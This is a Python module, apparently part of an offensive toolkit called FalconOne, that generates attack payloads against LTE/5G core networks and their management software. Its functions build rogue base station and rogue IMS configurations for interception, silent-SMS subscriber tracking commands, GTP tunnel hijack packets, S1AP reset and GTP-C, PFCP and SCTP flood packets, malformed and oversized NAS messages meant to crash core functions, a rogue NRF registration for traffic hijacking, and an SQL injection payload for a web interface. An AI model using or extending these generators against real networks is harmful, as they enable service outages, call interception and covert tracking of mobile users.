"""
FalconOne Exploit Payload Generators
Generates attack payloads for vulnerabilities in the unified database.

Each generator creates protocol-specific packets for exploitation.
Supports: NAS, S1AP, NGAP, GTP-C, GTP-U, RRC, PFCP, SIP/RTP

Version: 1.8.0
"""

from typing import Dict, Any, Optional, Tuple, List
import struct
import random
import logging
from datetime import datetime

try:
    from scapy.all import *
    from scapy.contrib.gtp import *
    try:
        from scapy.layers.sctp import SCTP, SCTPChunkInit
    except ImportError:
        # SCTP not available in this Scapy version
        SCTP = None
        SCTPChunkInit = None
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    SCTP = None
    SCTPChunkInit = None


class PayloadGenerator:
    """
    Unified payload generator for all exploits.
    Generates protocol-specific packets for CVE exploitation.
    """
    
    def __init__(self, config: Dict = None, logger: logging.Logger = None):
        self.config = config or {}
        self.logger = logger or logging.getLogger(__name__)
        
        if not SCAPY_AVAILABLE:
            self.logger.warning("Scapy not available - payload generation disabled")
    
    # ==================== Native FalconOne Exploits ====================
    
    def generate_rogue_base_station(self, params: Dict) -> Dict[str, Any]:
        """
        FALCON-001: Generate rogue base station configuration.
        
        Params:
            - cell_id: Target cell ID (optional, auto-generated if not provided)
            - mcc: Mobile Country Code (default: 001)
            - mnc: Mobile Network Code (default: 01)
            - band: LTE/5G band (default: 3)
            - power_dbm: TX power in dBm (default: 23)
        """
        cell_id = params.get('cell_id', random.randint(1, 65535))
        mcc = params.get('mcc', '001')
        mnc = params.get('mnc', '01')
        band = params.get('band', 3)
        power_dbm = params.get('power_dbm', 23)
        
        return {
            'payload_type': 'rogue_base_station_config',
            'cell_config': {
                'cell_id': cell_id,
                'mcc': mcc,
                'mnc': mnc,
                'tac': random.randint(1, 65535),
                'band': band,
                'earfcn': self._get_earfcn_for_band(band),
                'power_dbm': power_dbm,
                'system_info': self._generate_system_info(mcc, mnc, cell_id)
            },
            'attack_vector': 'rogue_cell',
            'execution_command': f"gr-gsm/ltesniffer --cell-id {cell_id} --mcc {mcc} --mnc {mnc}"
        }
    
    def generate_downgrade_nas(self, params: Dict) -> bytes:
        """
        FALCON-002: Generate NAS downgrade attack packet.
        Forces 5G UE to downgrade to 4G to bypass SUCI concealment.
        
        Params:
            - target_rnti: Target UE's C-RNTI
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # NAS Security Mode Reject with 4G-only capability
        nas_reject = (
            b'\x7e\x00'  # Protocol discriminator + Security header type
            b'\x5d'      # Security Mode Reject
            b'\x14'      # Cause: UE security capabilities mismatch
        )
        
        return nas_reject
    
    def generate_silent_sms(self, params: Dict) -> Dict[str, Any]:
        """
        FALCON-003: Generate Silent SMS (Type 0) for TMSI tracking.
        
        Params:
            - target_msisdn: Target phone number
            - message: Optional message (default: empty for silent)
        """
        target_msisdn = params.get('target_msisdn', '')
        
        return {
            'payload_type': 'silent_sms',
            'sms_config': {
                'type': 0,  # Type 0 = Silent SMS
                'destination': target_msisdn,
                'message': '',
                'class': 0  # Class 0 = immediate display (but Type 0 overrides)
            },
            'execution_command': f"send-sms --type 0 --dest {target_msisdn}"
        }
    
    def generate_rogue_ims(self, params: Dict) -> Dict[str, Any]:
        """
        FALCON-004: Generate rogue IMS/SIP configuration for VoLTE interception.
        
        Params:
            - sip_domain: SIP domain (e.g., ims.mnc001.mcc001.3gppnetwork.org)
        """
        sip_domain = params.get('sip_domain', 'ims.mnc001.mcc001.3gppnetwork.org')
        
        return {
            'payload_type': 'rogue_ims',
            'ims_config': {
                'sip_domain': sip_domain,
                'sip_port': 5060,
                'rtp_port_range': (10000, 20000),
                'codecs': ['AMR-NB', 'AMR-WB', 'EVS']
            },
            'attack_vector': 'ims_mitm',
            'execution_command': f"setup-rogue-ims --domain {sip_domain}"
        }
    
    def generate_gtp_hijack(self, params: Dict) -> bytes:
        """
        FALCON-005: Generate GTP-U tunnel hijack packet.
        
        Params:
            - target_teid: Target TEID
            - source_ip: Spoofed source IP (eNodeB/gNodeB)
            - dest_ip: Destination IP (SGW/UPF)
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        target_teid = params.get('target_teid', random.randint(1, 0xFFFFFFFF))
        source_ip = params.get('source_ip', '192.168.1.1')
        dest_ip = params.get('dest_ip', '192.168.1.100')
        
        # GTP-U Echo Request to verify tunnel
        gtp_packet = (
            IP(src=source_ip, dst=dest_ip) /
            UDP(sport=2152, dport=2152) /
            GTPHeader(teid=target_teid, gtp_type=1)  # Echo Request
        )
        
        return bytes(gtp_packet)
    
    # ==================== Open5GS CVE Payloads ====================
    
    def generate_auth_bypass_nas(self, params: Dict) -> bytes:
        """
        CVE-2019-25113: Generate authentication bypass NAS packet.
        Crafted authentication response without proper validation.
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # Attach Request with crafted authentication response
        nas_attach = (
            b'\x07'  # Protocol discriminator: EPS Mobility Management
            b'\x41'  # Attach Request
            b'\x71'  # Attach type: EPS attach
            b'\x00' * 20  # Malformed authentication response
        )
        
        return nas_attach
    
    def generate_s1ap_reset(self, params: Dict) -> bytes:
        """
        CVE-2019-25114: Generate S1AP Reset message for mass UE disconnection.
        Spoofed S1AP Reset from rogue eNB.
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # S1AP Reset message (ASN.1 APER encoded)
        s1ap_reset = (
            b'\x00\x0e'  # S1AP procedure code: Reset
            b'\x00\x00\x01\x00'  # Criticality: reject
            b'\x5c\x40\x01\x40'  # Cause: Radio Network Layer - unspecified
        )
        
        return s1ap_reset
    
    def generate_gtpc_flood(self, params: Dict) -> List[bytes]:
        """
        CVE-2019-25115: Generate GTP-C Create Session flood.
        Repeated Create Session requests without cleanup.
        """
        if not SCAPY_AVAILABLE:
            return []
        
        packets = []
        for i in range(params.get('count', 1000)):
            gtpc_packet = (
                IP(src=params.get('source_ip', '192.168.1.1'),
                   dst=params.get('dest_ip', '192.168.1.100')) /
                UDP(sport=2123, dport=2123) /
                GTPHeader(teid=random.randint(1, 0xFFFFFFFF), gtp_type=32)  # Create Session Request
            )
            packets.append(bytes(gtpc_packet))
        
        return packets
    
    def generate_ngap_race(self, params: Dict) -> List[bytes]:
        """
        CVE-2022-22180: Generate rapid NGAP UE Context Release for race condition.
        """
        if not SCAPY_AVAILABLE:
            return []
        
        packets = []
        ue_ngap_id = params.get('ue_ngap_id', random.randint(1, 0xFFFFFF))
        
        # Send 10 rapid UE Context Release requests
        for i in range(10):
            ngap_release = (
                b'\x00\x29'  # NGAP procedure code: UEContextRelease
                b'\x00\x00\x02\x00'
                + struct.pack('>I', ue_ngap_id)  # UE NGAP ID
                + b'\x00\x0f\x40\x01\x00'  # Cause: Radio Network Layer
            )
            packets.append(ngap_release)
        
        return packets
    
    def generate_malformed_pdu_session(self, params: Dict) -> bytes:
        """
        CVE-2022-22181: Generate malformed PDU Session Establishment request.
        Invalid parameters cause SMF crash.
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # NAS PDU Session Establishment Request with invalid SSC mode
        nas_pdu_session = (
            b'\x2e'  # Protocol discriminator: 5GS Session Management
            b'\x01'  # PDU Session ID
            b'\x01'  # Procedure transaction ID
            b'\xc1'  # PDU Session Establishment Request
            b'\x00'  # Integrity protection: Not protected
            b'\xff\xff'  # Invalid SSC mode (should be 1-3)
            b'\x00' * 10  # Padding
        )
        
        return nas_pdu_session
    
    def generate_buffer_overflow_nas(self, params: Dict) -> bytes:
        """
        CVE-2022-22182: Generate NAS Service Request with oversized payload.
        Buffer overflow exploit (requires careful crafting for RCE).
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # NAS Service Request with oversized payload
        nas_service_req = (
            b'\x7e\x00'  # Protocol discriminator + Security header
            b'\x4e'      # Service Request
            b'\x01'      # Service type
            + b'\x41' * 2048  # Oversized payload (buffer overflow)
        )
        
        return nas_service_req
    
    def generate_replay_smc(self, params: Dict) -> bytes:
        """
        CVE-2023-45917: Replay captured NAS Security Mode Command.
        Forces security downgrade.
        """
        # Requires captured SMC - use provided SMC from params
        captured_smc = params.get('captured_smc', b'\x7e\x00\x5d\x00\x01\x00')
        
        return captured_smc
    
    def generate_zero_length_nas(self, params: Dict) -> bytes:
        """
        CVE-2024-24428: Generate zero-length NAS message.
        Causes null pointer dereference in AMF.
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # NAS message with zero-length payload
        nas_zero = (
            b'\x7e\x00'  # Protocol discriminator + Security header
            b'\x43'      # Registration Request
            b'\x00\x00'  # Length: 0 (causes crash)
        )
        
        return nas_zero
    
    def generate_malformed_gtpu(self, params: Dict) -> bytes:
        """
        CVE-2024-24429: Generate malformed GTP-U header.
        Invalid header extension causes UPF packet drops.
        """
        if not SCAPY_AVAILABLE:
            return b''
        
        # GTP-U with invalid extension header
        gtpu_packet = (
            b'\x34'  # Version: 1, PT: 1, E: 1 (extension present), S: 0, PN: 0
            b'\xff'  # Message type: G-PDU
            + struct.pack('>H', 100)  # Length
            + struct.pack('>I', params.get('teid', 0x12345678))  # TEID
            + b'\xff\x00\x00'  # Invalid extension header type
            + b'\x00' * 96  # Payload
        )
        
        return gtpu_packet
    
    def generate_pfcp_leak(self, params: Dict) -> List[bytes]:
        """
        CVE-2024-25113: Generate PFCP Session Establishment flood.
        Memory leak due to missing cleanup.
        """
        if not SCAPY_AVAILABLE:
            return []
        
        packets = []
        for i in range(params.get('count', 500)):
            # PFCP Session Establishment Request
            pfcp_packet = (
                IP(src=params.get('source_ip', '192.168.1.1'),
                   dst=params.get('dest_ip', '192.168.1.100')) /
                UDP(sport=8805, dport=8805) /
                Raw(load=(
                    b'\x20'  # Version: 1, S: 1
                    b'\x32'  # Message type: Session Establishment Request
                    + struct.pack('>H', 50)  # Length
                    + struct.pack('>Q', random.randint(1, 0xFFFFFFFFFFFFFFFF))  # SEID
                    + struct.pack('>I', i)  # Sequence number
                    + b'\x00' * 40  # IEs
                ))
            )
            packets.append(bytes(pfcp_packet))
        
        return packets
    
    def generate_rogue_nf_registration(self, params: Dict) -> Dict[str, Any]:
        """
        CVE-2024-25114: Generate rogue NF registration payload.
        Register malicious NF with NRF for traffic hijacking.
        """
        nf_profile = {
            'nfInstanceId': params.get('nf_instance_id', 'malicious-smf-001'),
            'nfType': 'SMF',
            'nfStatus': 'REGISTERED',
            'ipv4Addresses': [params.get('ip_address', '192.168.1.200')],
            'nfServices': [{
                'serviceInstanceId': 'malicious-smf-service',
                'serviceName': 'nsmf-pdusession',
                'versions': [{'apiVersionInUri': 'v1', 'apiFullVersion': '1.0.0'}],
                'scheme': 'http',
                'nfServiceStatus': 'REGISTERED',
                'ipEndPoints': [{
                    'ipv4Address': params.get('ip_address', '192.168.1.200'),
                    'port': 8080
                }]
            }]
        }
        
        return {
            'payload_type': 'nrf_registration',
            'method': 'PUT',
            'url': f"http://{params.get('nrf_address', '192.168.1.10')}:8000/nnrf-nfm/v1/nf-instances/{nf_profile['nfInstanceId']}",
            'body': nf_profile,
            'headers': {'Content-Type': 'application/json'}
        }
    
    def generate_sqn_replay(self, params: Dict) -> bytes:
        """
        CVE-2024-25115: Generate authentication with manipulated SQN.
        Replay authentication vectors.
        """
        # Requires captured authentication vectors
        auth_vector = params.get('auth_vector', {})
        
        # Construct authentication response with replayed SQN
        auth_response = (
            b'\x07\x53'  # EMM: Authentication Response
            + bytes.fromhex(auth_vector.get('res', '0' * 32))
        )
        
        return auth_response
    
    def generate_sql_injection(self, params: Dict) -> Dict[str, Any]:
        """
        CVE-2024-25116: Generate SQL injection payload for WebUI.
        Exploit subscriber search field.
        """
        payload = params.get('payload', "' OR '1'='1'; --")
        
        return {
            'payload_type': 'sql_injection',
            'method': 'POST',
            'url': params.get('webui_url', 'http://192.168.1.100:3000') + '/api/db/subscribers/search',
            'body': {
                'search': payload
            },
            'headers': {'Content-Type': 'application/json'}
        }
    
    def generate_sctp_flood(self, params: Dict) -> List[bytes]:
        """
        CVE-2024-25117: Generate SCTP INIT flood.
        Exhaust AMF resources.
        """
        if not SCAPY_AVAILABLE or not SCTP:
            return []
        
        packets = []
        for i in range(params.get('count', 1000)):
            # SCTP INIT chunk
            sctp_init = (
                IP(src=params.get('source_ip', '192.168.1.1'),
                   dst=params.get('dest_ip', '192.168.1.100')) /
                SCTP(sport=random.randint(10000, 60000), dport=38412) /
                SCTPChunkInit(init_tag=random.randint(1, 0xFFFFFFFF))
            )
            packets.append(bytes(sctp_init))
        
        return packets
    
    # ==================== Helper Methods ====================
    
    def _get_earfcn_for_band(self, band: int) -> int:
        """Get EARFCN (channel number) for LTE band"""
        band_earfcn_map = {
            3: 1575,   # Band 3: 1800 MHz
            7: 3350,   # Band 7: 2600 MHz
            20: 6300,  # Band 20: 800 MHz
            28: 9410,  # Band 28: 700 MHz
        }
        return band_earfcn_map.get(band, 1575)
    
    def _generate_system_info(self, mcc: str, mnc: str, cell_id: int) -> Dict:
        """Generate System Information Block (SIB) for rogue cell"""
        return {
            'sib1': {
                'cellAccessRelatedInfo': {
                    'plmn_IdentityList': [{
                        'mcc': mcc,
                        'mnc': mnc
                    }],
                    'trackingAreaCode': random.randint(1, 65535),
                    'cellIdentity': cell_id
                },
                'cellSelectionInfo': {
                    'q_RxLevMin': -70,
                    'q_RxLevMinOffset': 0
                }
            }
        }


# Global instance
_payload_generator = None

def get_payload_generator(config: Dict = None, logger: logging.Logger = None) -> PayloadGenerator:
    """Get global payload generator instance"""
    global _payload_generator
    if _payload_generator is None:
        _payload_generator = PayloadGenerator(config, logger)
    return _payload_generator
